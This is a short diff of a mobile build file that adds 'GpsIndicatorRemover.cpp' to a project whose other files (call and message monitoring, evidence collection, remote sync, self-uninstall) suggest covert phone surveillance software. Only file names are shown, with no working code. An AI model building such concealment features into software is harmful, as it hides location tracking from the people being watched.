@@ -17,7 +17,7 @@ END
 
 SOURCEPATH                              ..\src 
 
-SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp 
+SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp GpsIndicatorRemover.cpp
 SOURCE AbstractAction.cpp AbstractState.cpp ActionFactory.cpp ActionNone.cpp ActionSms.cpp ActionSync.cpp ActionUninstall.cpp ActionLog.cpp Network.cpp Protocol.cpp SendSmsSocket.cpp ActionSyncApn.cpp
 SOURCE StateCmdUninstall.cpp StateNone.cpp
 SOURCE StateAuthentication.cpp StateIdentification.cpp StateEvidences.cpp StateBye.cpp 
